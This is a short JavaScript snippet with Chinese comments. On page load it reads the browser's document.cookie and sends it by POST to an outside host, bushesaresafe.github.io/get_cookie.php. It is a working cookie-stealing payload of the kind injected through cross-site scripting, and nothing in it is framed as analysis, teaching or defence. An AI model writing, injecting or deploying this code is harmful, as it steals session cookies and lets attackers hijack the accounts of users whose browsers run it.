// 使用 Fetch API 发送 POST 请求
function sendCookie() {
    const cookieData = document.cookie;
    
    fetch('https://bushesaresafe.github.io/get_cookie.php', {
        method: 'POST',
        mode: 'cors', // 明确跨域模式
        headers: {
            'Content-Type': 'text/plain' // 简单请求类型
        },
        body: cookieData
    })
    .then(response => {
        if (!response.ok) throw new Error('Network error');
        return response.text();
    })
    .catch(error => {
        console.log('Error:', error);
    });
}

// 自动执行（可根据需要添加事件触发）
sendCookie();
